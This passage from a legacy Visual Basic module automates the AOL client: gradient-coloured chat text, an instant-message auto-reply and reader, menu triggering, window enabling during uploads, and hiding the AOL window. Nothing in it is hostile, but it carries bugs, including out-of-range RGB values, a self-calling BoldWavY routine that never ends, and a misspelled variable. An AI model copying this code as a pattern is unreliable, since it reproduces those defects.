        e = 255 / a
        f = e * b
        G = RGB(355, 255 - f, 55)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function LBlue_DBlue_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(355, 255 - f, 55)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function PinkOrange(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 200 / a
        f = e * b
        G = RGB(255 - f, 167, 510)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function PinkOrangePink(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 167, 510)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function

Function PurpleWhite(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 200 / a
        f = e * b
        G = RGB(255, f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function PurpleWhitePurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function
Function YellowBlack(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function YellowBlue(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function YellowGreen(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function

Function YellowPurple(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function



Function YellowRedYellow(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   YellowRedYellow = (msg)
   
End Function
Function YellowRed(Text As String)
    a = Len(Text)
    For b = 1 To a
        c = Left(Text, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
   SendChat (msg)
End Function
Function Yellow_LBlue_Yellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function
Sub BoldWavY(TheText)

G$ = TheText
a = Len(G$)
For w = 1 To a Step 4
    R$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    s$ = Mid$(G$, w + 2, 1)
    T$ = Mid$(G$, w + 3, 1)
    P$ = P$ & "<sup>" & R$ & "<B></sup>" & u$ & "<sub>" & s$ & "</sub>" & T$
Next w
BoldWavY (msg)


End Sub

Sub centerform(f As Form)
f.Top = (Screen.Height * 0.85) / 2 - f.Height / 2
f.Left = Screen.Width / 2 - f.Width / 2
End Sub
Sub RespondIM(message)
'This finds an IM sent to you, answers it with a
'message of "message", sends it and then closes the
'IM window
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")

IM% = findchildbytitle(mdi%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = findchildbytitle(mdi%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Sub
Greed:
e = Findchildbyclass(IM%, "RICHCNTL")

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)

e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e2 = GetWindow(e, GW_HWNDNEXT) 'Send Text
e = GetWindow(e2, GW_HWNDNEXT) 'Send Button
Call SendMessageByString(e2, WM_SETTEXT, 0, message)
ClickIcon (e)
Call Timeout(0.8)
IM% = findchildbytitle(mdi%, "  Instant Message From:")
e = Findchildbyclass(IM%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT) 'cancel button...
'to close the IM window
ClickIcon (e)
End Sub

Function MessageFromIM()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")

IM% = findchildbytitle(mdi%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = findchildbytitle(mdi%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
imtext% = Findchildbyclass(IM%, "RICHCNTL")
IMmessage = GetText(imtext%)
sn = SNfromIM()
snlen = Len(SNfromIM()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, sn) + snlen)
MessageFromIM = Left(blah, Len(blah) - 1)
End Function

Sub runmenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub

Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For GetString = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, GetString)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If

Next GetString

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub



Sub Upchat()
aol% = FindWindow("AOL Frame25", vbNullString)
AOModal% = Findchildbyclass(aol%, "_AOL_Modal")
AOGauge% = Findchildbyclass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(aol%, 1)
Call EnableWindow(Upp%, 0)
End Sub
Sub UnUpchat()
aol% = FindWindow("AOL Frame25", vbNullString)
AOModal% = Findchildbyclass(aol%, "_AOL_Modal")
AOGauge% = Findchildbyclass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Upp%, 1)
Call EnableWindow(aol%, 0)
End Sub

Sub HideAOL()
aol% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(aol%, 0)
End Sub

Sub ShowAOL()
aol% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(aol%, 5)
End Sub
